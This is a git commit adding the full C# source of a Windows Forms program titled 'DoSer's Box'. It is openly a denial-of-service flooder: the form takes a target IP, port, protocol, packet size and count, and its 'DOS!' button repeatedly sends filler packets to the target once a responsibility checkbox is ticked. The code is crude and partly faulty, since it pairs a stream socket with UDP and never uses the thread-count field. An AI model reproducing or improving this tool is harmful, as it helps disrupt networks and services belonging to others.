372e837bc7825a71ba04fe4dab0552028e5aa2d6
Fatih Melih Özgün <ozgunfatihmelih@gmail.com>
2020-07-06 10:03:56 +0300

    Init

---
+++ dosersbox/Form1.Designer.cs
@@ -0,0 +1,232 @@
+﻿namespace dosersbox
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.dosbtn = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.ipadd = new System.Windows.Forms.TextBox();
+            this.mode = new System.Windows.Forms.ComboBox();
+            this.resb = new System.Windows.Forms.CheckBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.packetsize = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.packetcount = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.threadcount = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.portin = new System.Windows.Forms.TextBox();
+            this.label6 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // dosbtn
+            // 
+            this.dosbtn.Location = new System.Drawing.Point(799, 386);
+            this.dosbtn.Name = "dosbtn";
+            this.dosbtn.Size = new System.Drawing.Size(75, 23);
+            this.dosbtn.TabIndex = 0;
+            this.dosbtn.Text = "DOS!";
+            this.dosbtn.UseVisualStyleBackColor = true;
+            this.dosbtn.Click += new System.EventHandler(this.dosbtn_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(55, 52);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(68, 17);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "IP Adress";
+            // 
+            // ipadd
+            // 
+            this.ipadd.Location = new System.Drawing.Point(146, 52);
+            this.ipadd.Name = "ipadd";
+            this.ipadd.Size = new System.Drawing.Size(100, 22);
+            this.ipadd.TabIndex = 2;
+            // 
+            // mode
+            // 
+            this.mode.FormattingEnabled = true;
+            this.mode.Items.AddRange(new object[] {
+            "UDP",
+            "TCP"});
+            this.mode.Location = new System.Drawing.Point(146, 118);
+            this.mode.Name = "mode";
+            this.mode.Size = new System.Drawing.Size(121, 24);
+            this.mode.TabIndex = 3;
+            // 
+            // resb
+            // 
+            this.resb.AllowDrop = true;
+            this.resb.AutoSize = true;
+            this.resb.Location = new System.Drawing.Point(391, 371);
+            this.resb.Name = "resb";
+            this.resb.Size = new System.Drawing.Size(402, 38);
+            this.resb.TabIndex = 4;
+            this.resb.Text = "I am taking full responsibility\r\n for the consequences of my actions by using thi" +
+    "s program.\r\n";
+            this.resb.UseVisualStyleBackColor = true;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(55, 118);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(43, 17);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "Mode";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.BackgroundImage")));
+            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
+            this.pictureBox1.Location = new System.Drawing.Point(380, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(523, 310);
+            this.pictureBox1.TabIndex = 6;
+            this.pictureBox1.TabStop = false;
+            // 
+            // packetsize
+            // 
+            this.packetsize.Location = new System.Drawing.Point(146, 254);
+            this.packetsize.Name = "packetsize";
+            this.packetsize.Size = new System.Drawing.Size(100, 22);
+            this.packetsize.TabIndex = 8;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(55, 254);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(82, 17);
+            this.label3.TabIndex = 7;
+            this.label3.Text = "Packet Size";
+            // 
+            // packetcount
+            // 
+            this.packetcount.Location = new System.Drawing.Point(146, 322);
+            this.packetcount.Name = "packetcount";
+            this.packetcount.Size = new System.Drawing.Size(100, 22);
+            this.packetcount.TabIndex = 10;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(55, 322);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(92, 17);
+            this.label4.TabIndex = 9;
+            this.label4.Text = "Packet Count";
+            // 
+            // threadcount
+            // 
+            this.threadcount.Location = new System.Drawing.Point(146, 386);
+            this.threadcount.Name = "threadcount";
+            this.threadcount.Size = new System.Drawing.Size(100, 22);
+            this.threadcount.TabIndex = 12;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(55, 386);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(95, 17);
+            this.label5.TabIndex = 11;
+            this.label5.Text = "Thread Count";
+            // 
+            // portin
+            // 
+            this.portin.Location = new System.Drawing.Point(146, 179);
+            this.portin.Name = "portin";
+            this.portin.Size = new System.Drawing.Size(100, 22);
+            this.portin.TabIndex = 14;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(55, 179);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(34, 17);
+            this.label6.TabIndex = 13;
+            this.label6.Text = "Port";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.SteelBlue;
+            this.ClientSize = new System.Drawing.Size(926, 450);
+            this.Controls.Add(this.portin);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.threadcount);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.packetcount);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.packetsize);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.resb);
+            this.Controls.Add(this.mode);
+            this.Controls.Add(this.ipadd);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.dosbtn);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Opacity = 0.9D;
+            this.Text = "DoSer\'s Box";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button dosbtn;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox ipadd;
+        private System.Windows.Forms.ComboBox mode;
+        private System.Windows.Forms.CheckBox resb;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.TextBox packetsize;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox packetcount;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.TextBox threadcount;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox portin;
+        private System.Windows.Forms.Label label6;
+    }
+}
+
---
+++ dosersbox/Form1.cs
@@ -0,0 +1,89 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace dosersbox
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void dosbtn_Click(object sender, EventArgs e)
+        {
+            
+           
+
+            if (resb.Checked == true)
+            {
+                try
+                {
+                    byte[] messageSent = Encoding.ASCII.GetBytes(new string('X', (int)long.Parse(packetsize.Text)));
+                    IPAddress ipAddr = IPAddress.Parse(ipadd.Text);
+
+                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, (int)long.Parse(portin.Text));
+
+
+                    // Creation TCP/IP Socket using  
+                    // Socket Class Costructor 
+
+                    Socket socket;
+
+                    if (mode.SelectedItem == "UDP")
+                    {
+                        socket = new Socket(ipAddr.AddressFamily,
+                               SocketType.Stream, ProtocolType.Udp);
+                    }
+                    else
+                    {
+                        socket = new Socket(ipAddr.AddressFamily,
+                               SocketType.Stream, ProtocolType.Tcp);
+                    }
+
+                    socket.Connect(localEndPoint);
+
+                    for (int i = 0; i < Int64.Parse(packetcount.Text); i++)
+                    {
+                        try
+                        {
+                            socket.Send(messageSent);
+                        }
+                        catch (System.Net.Sockets.SocketException)
+                        {
+                            MessageBox.Show("Remote Host closed the connection or an unexpected error occured", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+                        
+                    }
+
+
+
+                    MessageBox.Show("Done!");
+                }
+                catch (Exception)
+                {
+
+                    MessageBox.Show("There was an error trying to DOS. Please check settings and retry", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+                }
+                
+            }
+            else
+            {
+                MessageBox.Show("You have to accept agrement", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
+            
+        }
+    }
+}
